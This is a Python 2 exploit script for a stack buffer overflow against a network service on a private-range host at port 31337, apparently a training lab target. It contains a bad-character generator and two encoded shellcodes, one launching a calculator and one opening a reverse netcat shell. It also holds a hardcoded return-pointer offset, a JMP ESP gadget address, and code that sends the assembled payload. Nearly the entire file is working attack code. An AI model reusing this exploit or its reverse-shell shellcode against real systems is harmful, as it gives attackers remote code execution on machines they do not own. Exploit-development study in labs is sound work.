import socket
import struct

RHOST = "192.168.0.136"
RPORT = 31337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

########### BAD CHARS ##############
#bdch_test = ""
bdch = [0x00, 0x0A]

# gen string
for i in range(0x00, 0xFF+1):
	if i not in bdch:
		bdch_test +=chr(i)

# write file
#with open("bdch.bin", "wb") as f:
#	f.write(bdch_test)


########### END BDCH #############
########## SHELLCODE #############
shellcode_calc =  b""
shellcode_calc += b"\xbe\x4d\xdd\xd9\x34\xdb\xdf\xd9\x74\x24"
shellcode_calc += b"\xf4\x5a\x31\xc9\xb1\x31\x83\xc2\x04\x31"
shellcode_calc += b"\x72\x0f\x03\x72\x42\x3f\x2c\xc8\xb4\x3d"
shellcode_calc += b"\xcf\x31\x44\x22\x59\xd4\x75\x62\x3d\x9c"
shellcode_calc += b"\x25\x52\x35\xf0\xc9\x19\x1b\xe1\x5a\x6f"
shellcode_calc += b"\xb4\x06\xeb\xda\xe2\x29\xec\x77\xd6\x28"
shellcode_calc += b"\x6e\x8a\x0b\x8b\x4f\x45\x5e\xca\x88\xb8"
shellcode_calc += b"\x93\x9e\x41\xb6\x06\x0f\xe6\x82\x9a\xa4"
shellcode_calc += b"\xb4\x03\x9b\x59\x0c\x25\x8a\xcf\x07\x7c"
shellcode_calc += b"\x0c\xf1\xc4\xf4\x05\xe9\x09\x30\xdf\x82"
shellcode_calc += b"\xf9\xce\xde\x42\x30\x2e\x4c\xab\xfd\xdd"
shellcode_calc += b"\x8c\xeb\x39\x3e\xfb\x05\x3a\xc3\xfc\xd1"
shellcode_calc += b"\x41\x1f\x88\xc1\xe1\xd4\x2a\x2e\x10\x38"
shellcode_calc += b"\xac\xa5\x1e\xf5\xba\xe2\x02\x08\x6e\x99"
shellcode_calc += b"\x3e\x81\x91\x4e\xb7\xd1\xb5\x4a\x9c\x82"
shellcode_calc += b"\xd4\xcb\x78\x64\xe8\x0c\x23\xd9\x4c\x46"
shellcode_calc += b"\xc9\x0e\xfd\x05\x87\xd1\x73\x30\xe5\xd2"
shellcode_calc += b"\x8b\x3b\x59\xbb\xba\xb0\x36\xbc\x42\x13"
shellcode_calc += b"\x73\x22\xa1\xb6\x89\xcb\x7c\x53\x30\x96"
shellcode_calc += b"\x7e\x89\x76\xaf\xfc\x38\x06\x54\x1c\x49"
shellcode_calc += b"\x03\x10\x9a\xa1\x79\x09\x4f\xc6\x2e\x2a"
shellcode_calc += b"\x5a\xa5\xb1\xb8\x06\x04\x54\x39\xac\x58"

shellcode_rev_nc =  b""
shellcode_rev_nc += b"\xbf\xaa\x28\xb4\xfa\xd9\xe8\xd9\x74\x24"
shellcode_rev_nc += b"\xf4\x5d\x31\xc9\xb1\x52\x31\x7d\x12\x83"
shellcode_rev_nc += b"\xed\xfc\x03\xd7\x26\x56\x0f\xdb\xdf\x14"
shellcode_rev_nc += b"\xf0\x23\x20\x79\x78\xc6\x11\xb9\x1e\x83"
shellcode_rev_nc += b"\x02\x09\x54\xc1\xae\xe2\x38\xf1\x25\x86"
shellcode_rev_nc += b"\x94\xf6\x8e\x2d\xc3\x39\x0e\x1d\x37\x58"
shellcode_rev_nc += b"\x8c\x5c\x64\xba\xad\xae\x79\xbb\xea\xd3"
shellcode_rev_nc += b"\x70\xe9\xa3\x98\x27\x1d\xc7\xd5\xfb\x96"
shellcode_rev_nc += b"\x9b\xf8\x7b\x4b\x6b\xfa\xaa\xda\xe7\xa5"
shellcode_rev_nc += b"\x6c\xdd\x24\xde\x24\xc5\x29\xdb\xff\x7e"
shellcode_rev_nc += b"\x99\x97\x01\x56\xd3\x58\xad\x97\xdb\xaa"
shellcode_rev_nc += b"\xaf\xd0\xdc\x54\xda\x28\x1f\xe8\xdd\xef"
shellcode_rev_nc += b"\x5d\x36\x6b\xeb\xc6\xbd\xcb\xd7\xf7\x12"
shellcode_rev_nc += b"\x8d\x9c\xf4\xdf\xd9\xfa\x18\xe1\x0e\x71"
shellcode_rev_nc += b"\x24\x6a\xb1\x55\xac\x28\x96\x71\xf4\xeb"
shellcode_rev_nc += b"\xb7\x20\x50\x5d\xc7\x32\x3b\x02\x6d\x39"
shellcode_rev_nc += b"\xd6\x57\x1c\x60\xbf\x94\x2d\x9a\x3f\xb3"
shellcode_rev_nc += b"\x26\xe9\x0d\x1c\x9d\x65\x3e\xd5\x3b\x72"
shellcode_rev_nc += b"\x41\xcc\xfc\xec\xbc\xef\xfc\x25\x7b\xbb"
shellcode_rev_nc += b"\xac\x5d\xaa\xc4\x26\x9d\x53\x11\xe8\xcd"
shellcode_rev_nc += b"\xfb\xca\x49\xbd\xbb\xba\x21\xd7\x33\xe4"
shellcode_rev_nc += b"\x52\xd8\x99\x8d\xf9\x23\x4a\x72\x55\x2b"
shellcode_rev_nc += b"\x08\x1a\xa4\x2b\xc4\xe8\x21\xcd\xbe\x1e"
shellcode_rev_nc += b"\x64\x46\x57\x86\x2d\x1c\xc6\x47\xf8\x59"
shellcode_rev_nc += b"\xc8\xcc\x0f\x9e\x87\x24\x65\x8c\x70\xc5"
shellcode_rev_nc += b"\x30\xee\xd7\xda\xee\x86\xb4\x49\x75\x56"
shellcode_rev_nc += b"\xb2\x71\x22\x01\x93\x44\x3b\xc7\x09\xfe"
shellcode_rev_nc += b"\x95\xf5\xd3\x66\xdd\xbd\x0f\x5b\xe0\x3c"
shellcode_rev_nc += b"\xdd\xe7\xc6\x2e\x1b\xe7\x42\x1a\xf3\xbe"
shellcode_rev_nc += b"\x1c\xf4\xb5\x68\xef\xae\x6f\xc6\xb9\x26"
shellcode_rev_nc += b"\xe9\x24\x7a\x30\xf6\x60\x0c\xdc\x47\xdd"
shellcode_rev_nc += b"\x49\xe3\x68\x89\x5d\x9c\x94\x29\xa1\x77"
shellcode_rev_nc += b"\x1d\x49\x40\x5d\x68\xe2\xdd\x34\xd1\x6f"
shellcode_rev_nc += b"\xde\xe3\x16\x96\x5d\x01\xe7\x6d\x7d\x60"
shellcode_rev_nc += b"\xe2\x2a\x39\x99\x9e\x23\xac\x9d\x0d\x43"
shellcode_rev_nc += b"\xe5"
########## END SHELLCODE #############


# build exploit
buf_tot_len = 1024
#MONA PATTERN
#!mona pattern_create 1024
#!mona pattern_offset 39654138

offset_srp = 146
# gadget JMP ESP
# 080416BF, 080414C3
#ptr_jmp_esp = 0x080416bf
ptr_jmp_esp = 0x080414c3


buf = ""
buf += "A"*(offset_srp - len(buf))
buf += struct.pack("<I",ptr_jmp_esp)
#buf += "\xCC\xCC\xCC\xCC"
# NOP SLED
#buf += "\x90"*12
# sub ESP
buf += "\x83\xec\x10"
buf += shellcode_rev_nc
#buf += "BBBB"
#buf += bdch_test
buf += "D"*(buf_tot_len - len(buf))
buf += "\n"

#buf += "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4"

s.send(buf)

print "Sent: {0}".format(buf)

data = s.recv(1024)

print "Recieved:  {0}".format(data)
